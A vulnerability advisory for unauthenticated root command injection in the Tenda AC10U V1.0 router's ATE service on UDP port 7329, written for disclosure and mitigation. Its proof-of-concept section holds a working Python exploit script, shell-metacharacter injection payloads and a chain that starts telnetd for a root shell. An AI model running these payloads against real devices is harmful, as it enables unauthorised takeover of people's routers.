# Tenda AC10U V1.0 — Unauthenticated OS Command Injection in ATE Service (UDP 7329)

| Field | Value |
|---|---|
| **Product** | Tenda AC10U (V1.0, AC1200) |
| **Firmware** | V15.03.06.48_multi_TDE01 (build 2018-02-11) |
| **Platform** | MIPS32 little-endian, uClibc, Realtek RTL8197DN |
| **Vulnerability class** | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |
| **Related weakness** | CWE-306 — Missing Authentication for Critical Function (precondition) |
| **CVSS v3.1** | `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.8 (High)** |
| **Authentication required** | None (factory/reset state, `sys.userpass` empty) |
| **Attack vector** | Adjacent network (LAN) |
| **Impact** | Arbitrary command execution as **root** |
| **Status** | Confirmed (dynamic proof of concept) |
| **CVE ID** | *Requested — VulDB submission pending* |
| **Disclosure** | Public advisory (this repository) |

> **Scope note.** This repository documents a single finding: unauthenticated command
> injection in the ATE service (`ifconfig` sink). A separate stack-based buffer overflow
> in `readUsb` is intentionally **not** described here and is tracked independently.

---

## 0. Repository layout

| Path | Content |
|---|---|
| `README.md` | This advisory |
| `poc/verify_c1.py` | Minimal, non-destructive verification (writes `id` output to `/tmp`) |
| `poc/chain_c1.py` | Sanitized full-chain helper: start ATE → inject `telnetd` → verify port 23 |
| `evidence/marker_ate_rce_proof.txt` | Marker file produced by the injected command (`root:x:0:`) |
| `evidence/chain_transcript.txt` | Sanitized end-to-end transcript (credential redacted) |

---

## 1. Summary

Tenda AC10U V1.0 firmware V15.03.06.48_multi_TDE01 exposes a manufacturing/debug
service ("ATE") on **UDP port 7329**. In the factory state — i.e. whenever no
administrative password has ever been set — an unauthenticated
`GET /goform/ate` request starts the service with no credentials.

The ATE text protocol dispatches commands through a 14-entry table
(`g_ate_cmds@0x540ec8`, entry stride `0x34`). The `ifconfig` handler
(`ate_ifconfig_set@0x480a80`) concatenates the attacker-supplied argument into
`doSystemCmd("ifconfig " + arg)` without filtering shell metacharacters. Because the
httpd process runs as **uid 0**, any adjacent-network attacker can execute arbitrary
commands with root privileges.

The `iwpriv` handler (`iwpriv_wlan_set@0x4806c8`) and the `Tenda_mfg USB` handler
(`readUsb@0x47e10c`, `doSystemCmd("cat %s > /dev/null", mnt)`) provide the same class
of injection through the same unauthenticated channel. A separate stack-based buffer
overflow in `readUsb` is tracked as an independent finding.

## 2. Affected components

| Item | Value |
|---|---|
| Firmware image SHA-256 | `0bace3ed6a9b9b0a5c033bde4b0d122e6bd4494b35f28c0531abbd0bfb9edbdf` |
| `bin/httpd` SHA-256 | `a4067dde7928a1ef3838624d2b3eaa125bfdbbd923a05587e1dfc7ceb18161c9` |
| `bin/httpd` properties | MIPS32 LE, uClibc, **not stripped** (DWARF present), non-PIE |
| Factory config | `webroot_ro/default.cfg:304` → `sys.userpass=` (empty) |

Only the AC10U V1.0 / V15.03.06.48 image above was analysed. Other hardware revisions
and firmware generations are outside the scope of this testing and were not verified.

## 3. Technical details

### 3.1 Authentication bypass for the debug endpoints

`R7WebsSecurityHandler@0x434e80` contains:

```c
if ((!strncmp(url, "/goform/telnet") || !strncmp(url, "/goform/ate"))
    && !g_Pass[0]) {
    /* request is handled without authentication */
}
```

`g_Pass` is populated from `sys.userpass`. In the factory/reset state the string is
empty, so `g_Pass[0] == 0` and both `/goform/ate` and `/goform/telnet` are served
without any credential.

### 3.2 ATE service start-up

```
GET /goform/ate
  -> TendaAte@0x4825ac
  -> InitMfgTask@0x4824d0
  -> ate_main_handle@0x481cd0      bind(0.0.0.0:7329), no authentication
```

The socket is bound to `0.0.0.0`, not to the LAN interface address.

### 3.3 Command dispatch and sinks

`ate_cmd_find_match@0x48144c` splits the UDP datagram on whitespace and resolves the
first token against `g_ate_cmds[14]@0x540ec8` (stride `0x34`). The remainder of the
packet is passed verbatim as the command argument.

| Command | Handler | Sink |
|---|---|---|
| `ifconfig` | `ate_ifconfig_set@0x480a80` | `doSystemCmd("ifconfig " + arg)` — **no prefix filter** |
| `Tenda_mfg USB` | `readUsb@0x47e10c` | `doSystemCmd("cat %s > /dev/null", mntFileName)` |
| `iwpriv` | `iwpriv_wlan_set@0x4806c8` | `doSystemCmd(cmd_buf)` (non-`mp_query` branches) |

Shell metacharacters (`;`, `|`, `&`, backticks, `$()`, redirections, newlines) are not
filtered anywhere on this path.

## 4. Proof of concept

Precondition: the device is in factory/reset state (`sys.userpass` empty).

### 4.1 Minimal verification (non-destructive)

`poc/verify_c1.py` sends a single UDP datagram:

```python
#!/usr/bin/env python3
# Minimal, non-destructive verification of the `ifconfig` command-injection sink.
import socket, sys

host = sys.argv[1]
payload = b"ifconfig ;id>/tmp/ate_proof;#"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(10)
s.sendto(payload, (host, 7329))
print("response:", s.recvfrom(4096)[0][:120])
```

Expected result: the service replies `success`, and `/tmp/ate_proof` on the device
contains the output of `id` — `uid=0(root) gid=0(root)`, because httpd runs as root.

A payload actually executed during testing was
`ifconfig ;cat</etc_ro/group>/tmp/ate_rce_proof;#`, whose marker file began with
`root:x:0:` — confirming that the command ran with root privileges.

### 4.2 Full chain (sanitized)

The full chain from an unauthenticated LAN peer to a root shell is shown below.
Steps 1–3 are automated by `poc/chain_c1.py`; step 4 is performed manually.

| Step | Action | Observed result |
|---|---|---|
| 1 | `GET /goform/ate` | ATE listener started on UDP 7329, no credential |
| 2 | UDP 7329: `ifconfig ;/usr/sbin/telnetd -b <lan_ip>;#` | response `success` |
| 3 | TCP connect to `<lan_ip>`:23 | port 23 `LISTEN` |
| 4 | telnet login (credential redacted) | `~ # id` → `uid=0(root) gid=0(root)` |

The credential used in step 4 is **not** part of this finding. It is a separate
hard-coded-credential issue and is deliberately redacted from this advisory, so the
chain as published stops at a listening telnet daemon. The sanitized transcript is
`evidence/chain_transcript.txt`; the unredacted version is available privately to the
CNA or vendor on request.

No reverse shell, persistence mechanism, destructive command, or credential is
published.

### 4.3 Dynamic verification environment

- QEMU user-mode (`qemu-mipsel-static`) with chroot over the extracted squashfs root.
- Two environment patches were applied outside the vulnerable path so that httpd can
  boot in emulation:
  - the hardware-setting branches at `0x433c8a` / `0x433cd7` / `0x433d2b` were changed
    from `bgez` to `b`;
  - `libChipApi.so` `Set_Mfg_Button_Test@0x7098` was neutralised (`li v0,0; jr ra`),
    since `/dev/gpio` does not exist in the emulated environment.
- The vulnerable code (`R7WebsSecurityHandler`, `ate_main_handle`, `ate_cmd_find_match`,
  `ate_ifconfig_set`) was **not modified**.

## 5. Impact

- Unauthenticated root command execution on the LAN segment.
- Full device compromise: reading `/etc_ro/shadow`, persistent configuration changes,
  and control of all network services on the device.
- The full chain (Section 4.2) reaches a root shell once `telnetd` is started; the login
  credential itself is a separate finding and is not disclosed in this advisory.
- The service listens on `0.0.0.0:7329`; reachability from the WAN side depends on the
  device firewall policy and was not verified.

## 6. Existing CVEs and differences

| CVE | Product / version | Mechanism | Difference |
|---|---|---|---|
| CVE-2023-2649 | AC23 `16.03.07.45_cn` | `/bin/ate`, port 7329, parameter `v2` | Different product and firmware line |
| CVE-2025-46628 | RX2 Pro `16.03.30.14` | ATE UDP → root shell | Different product |
| CVE-2025-57219 | AC10 **v4.0** `V16.03.10.09` | Improper access control on `/goform/ate` | **Different defect class** (CWE-284 vs CWE-78) |
| CVE-2025-57220 | AC10 **v4.0** `V16.03.10.09` | ATE service reaching root | **Different hardware revision and firmware generation** |

The tested image is the AC10U **V1.0** hardware revision running the **V15.03**
MIPS/uClibc generation (build 2018-02-11, Realtek RTL8197DN). The AC10 v4.0 entries
refer to the V16.03 generation. No public fingerprint of the v4.0 binary is available,
so shared code cannot be assumed; all function addresses and the command-table layout
above are specific to this image.

## 7. Mitigation

- Set an administrative password on the device (removes the `!g_Pass[0]` condition),
  and do not leave devices in factory state on a network.
- Block UDP port 7329 on the LAN/WAN boundary where possible.
- Vendor-side: authenticate the ATE service unconditionally, bind it to the loopback or
  LAN interface only, restrict it to production builds, and avoid passing user input to
  `doSystemCmd` without validation (use `exec*` with an argument vector).

## 8. Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-29 | Static analysis and identification of the injection sinks |
| 2026-10-30 | Dynamic confirmation in QEMU (root command execution, marker file) |
| 2026-11-02 | Public advisory published in this repository |
| 2026-11-03 | Full-chain PoC (`poc/chain_c1.py`) and sanitized transcript added |
| 2026-11-03 | CVE request via VulDB (MITRE-authorized CNA) — in progress |

## 9. Notes on scope and integrity of the report

- The dynamic evidence was produced under QEMU user-mode emulation, not on physical
  hardware. The defect itself (unfiltered concatenation into `doSystemCmd`) is
  established by static code analysis; the dynamic run only confirms the observed
  behaviour is consistent.
- No personal information, contact addresses, or identifiers of the researcher are
  included in this document or its attachments.
- This advisory describes the full chain only up to a listening `telnetd` and a redacted
  login step. No credential, reverse shell, persistence mechanism, or turnkey payload is
  published. Testing was performed against a locally emulated image only.

## 10. References

- Vendor: Tenda — https://www.tendacn.com
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
